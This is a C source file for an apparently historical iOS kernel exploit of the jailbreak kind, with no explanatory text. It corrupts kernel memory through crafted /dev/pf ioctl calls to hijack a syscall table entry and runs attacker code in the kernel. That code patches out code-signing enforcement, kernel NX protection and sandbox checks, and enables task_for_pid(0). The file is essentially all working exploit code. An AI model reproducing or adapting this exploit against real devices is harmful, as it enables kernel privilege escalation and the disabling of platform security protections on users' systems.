#define PF 1
#define PRIVATE 1
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdbool.h>
#include <assert.h>
#include <stddef.h>
#include <stdio.h>
#include "pfvar.h"
#include <stdlib.h>
#include <string.h>
#include <config/config.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <net/if.h>

//#define DEBUG

#ifndef DEBUG
// strings are big and not very sneaky.
#undef assert
#define assert(x) do { if(!(x)) abort(); } while(0)
#endif

#if 1
#undef assert
#define assert(x) do { if(!(x)) failz(__LINE__); } while(0)

static void failz(int line) {
    line += 10000;
    sysctlbyname("net.inet6.ip6.hdrnestlimit", NULL, 0, &line, sizeof(line));
    setenv("DYLD_INSERT_LIBRARIES", "", 1);
    execl("/sbin/launchd", "/sbin/launchd", NULL);
}
#endif

static int pffd;

static void pwn(unsigned int addr) {
    struct pfioc_trans trans;
    struct pfioc_trans_e trans_e;
    struct pfioc_pooladdr pp;
    struct pfioc_rule pr;

    memset(&trans, 0, sizeof(trans));
    memset(&trans_e, 0, sizeof(trans_e));
    memset(&pr, 0, sizeof(pr));

    trans.size = 1;
    trans.esize = sizeof(trans_e);
    trans.array = &trans_e;
    trans_e.rs_num = PF_RULESET_FILTER;
    memset(trans_e.anchor, 0, MAXPATHLEN);
    assert(!ioctl(pffd, DIOCXBEGIN, &trans)); 
    u_int32_t ticket = trans_e.ticket;

    assert(!ioctl(pffd, DIOCBEGINADDRS, &pp));
    u_int32_t pool_ticket = pp.ticket;

    pr.action = PF_PASS;
    pr.nr = 0;
    pr.ticket = ticket;
    pr.pool_ticket = pool_ticket;
    memset(pr.anchor, 0, MAXPATHLEN);
    memset(pr.anchor_call, 0, MAXPATHLEN);

    pr.rule.return_icmp = 0;
    pr.rule.action = PF_PASS;
    pr.rule.af = AF_INET;
    pr.rule.proto = IPPROTO_TCP;
    pr.rule.rt = 0;
    pr.rule.rpool.proxy_port[0] = htons(1);
    pr.rule.rpool.proxy_port[1] = htons(1);

    pr.rule.src.addr.type = PF_ADDR_ADDRMASK;
    pr.rule.dst.addr.type = PF_ADDR_ADDRMASK;
    
    pr.rule.overload_tbl = (void *)(addr - 0x4a4);
    
    errno = 0;

    assert(!ioctl(pffd, DIOCADDRULE, &pr));

    assert(!ioctl(pffd, DIOCXCOMMIT, &trans));

    pr.action = PF_CHANGE_REMOVE;
    assert(!ioctl(pffd, DIOCCHANGERULE, &pr));
}

extern void patch_start();
extern void patch_end();

#define flush_dcache ((void (*)(void *addr, unsigned size, bool phys)) CONFIG_FLUSH_DCACHE)
#define invalidate_icache ((void (*)(void *addr, unsigned size, bool phys)) CONFIG_INVALIDATE_ICACHE)
#define copyin ((void (*)(void *uaddr, void *kaddr, size_t len)) CONFIG_COPYIN)
#define IOLog ((void (*)(char *fmt, ...)) CONFIG_IOLOG)
#define kalloc ((void *(*)(unsigned int)) CONFIG_KALLOC)
#define lck_rw_lock_exclusive ((void (*)(void *)) CONFIG_LCK_RW_LOCK_EXCLUSIVE)
#define lck_rw_done ((void (*)(void *)) CONFIG_LCK_RW_DONE)

// yuck
#define vm_map_to_entry(map)    ((struct vm_map_entry *) ((char *)(map) + 12))

struct vm_map_entry;
struct vm_map_links {
    struct vm_map_entry *prev;      /* previous entry */
    struct vm_map_entry *next;      /* next entry */
    uint32_t     start;      /* start address */
    uint32_t     end;        /* end address */
};
typedef struct vm_map_entry {
    struct vm_map_links links;
#define vme_prev        links.prev                                               
#define vme_next        links.next                                               
#define vme_start       links.start                                              
#define vme_end         links.end                                                
    void *object;//union vm_map_object object;
    uint64_t  offset;
    unsigned int is_shared:1, is_sub_map:1, in_transition:1, needs_wakeup:1, behavior:2, needs_copy:1, protection:3, max_protection:3, inheritance:2, use_pmap:1, alias:8,        no_cache:1, permanent:1, superpage_size:3, zero_wired_pages:1, pad:2;
    unsigned short      wired_count;
    unsigned short      user_wired_count;
} *vm_map_entry_t;

static inline void flush(void *addr, unsigned size) {
    flush_dcache(addr, size, false);
    invalidate_icache(addr, size, false);
}

#if 0
__attribute__((always_inline))
static inline void memory_hax() {
    void *k = *((void **) CONFIG_KERNEL_MAP);
    lck_rw_lock_exclusive(k);
    vm_map_entry_t cur, orig, last;
    cur = orig = vm_map_to_entry(k);
    last = orig->vme_prev;
    int count = 0;
    while(cur != last && count++ < 1000) {
        if(cur->max_protection == 0) {
            cur->max_protection = cur->protection = 7; // RWX
        }
        cur = cur->vme_next;
    }
    lck_rw_done(k);
}
#endif

extern int ok_go(void *p, void *uap, unsigned int *retval) {
    IOLog("Whoa, I'm here!...\n");
#   define P(patch) do { *((volatile unsigned int *) CONFIG_##patch) = CONFIG_##patch##_TO; flush_dcache((void *) CONFIG_##patch, 4, false); flush((void *) CONFIG_##patch, 4); } while(0)

    P(PATCH1);
    P(PATCH3);
    P(PATCH4);
    P(PATCH_CS_ENFORCEMENT_DISABLE);
    P(PATCH_KERNEL_PMAP_NX_ENABLED);
    P(PATCH_TFP0);
    *((unsigned int *) CONFIG_SYSENT_PATCH) = CONFIG_SYSENT_PATCH_ORIG;
    flush((void *) CONFIG_SYSENT_PATCH, 4);

    unsigned int copysize = (char *)(&patch_end) - (char *)(&patch_start);
    void *scratch = kalloc(0x1000);
    copyin(&patch_start, scratch, copysize);
    flush(scratch, copysize);
    
    // *this* won't work on thumb-1...
    *((unsigned int *) CONFIG_SB_EVALUATE) = 0xf000f8df; // ldr pc, [pc]
    *((unsigned int *) (CONFIG_SB_EVALUATE + 4)) = (unsigned int)scratch | 1;
    flush((void *) CONFIG_SB_EVALUATE, 8);
    
    //memory_hax();

    return 0;

}

int main() {
    unsigned int target_addr = CONFIG_TARGET_ADDR;
    unsigned int target_addr_real = target_addr & ~1;
    unsigned int target_pagebase = target_addr & ~0xfff;
    unsigned int num_decs = (CONFIG_SYSENT_PATCH_ORIG - target_addr) >> 24;
    assert(MAP_FAILED != mmap((void *)target_pagebase, 0x2000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0));
    *((unsigned int *) target_addr_real) = 0xf000f8df; // ldr pc, [pc]
    *((unsigned int *) (target_addr_real + 4)) = (unsigned int)&ok_go | 1;
    assert(!mprotect((void *)target_pagebase, 0x2000, PROT_READ | PROT_EXEC));
    
    // Yes, reopening is necessary
    pffd = open("/dev/pf", O_RDWR);
    ioctl(pffd, DIOCSTOP);
    assert(!ioctl(pffd, DIOCSTART));
    unsigned int sysent_patch = CONFIG_SYSENT_PATCH;
    while(num_decs--)
        pwn(sysent_patch+3);
    assert(!ioctl(pffd, DIOCSTOP));
    close(pffd);
    
    assert(!mlock((void *) ((unsigned int)(&ok_go) & ~0xfff), 0x1000));
    assert(!mlock((void *) ((unsigned int)(&flush) & ~0xfff), 0x1000));
    assert(!mlock((void *) target_pagebase, 0x2000));
#ifdef DEBUG
    printf("ok\n"); fflush(stdout);
#endif
    syscall(0);
#ifdef DEBUG
    printf("we're out\n"); fflush(stdout);
#endif
    
    // turn this fancy stuff back on
    int one = 1;
    assert(!sysctlbyname("security.mac.vnode_enforce", NULL, 0, &one, sizeof(one)));

    setenv("DYLD_INSERT_LIBRARIES", "", 1);
    execl("/sbin/launchd", "/sbin/launchd", NULL);
}
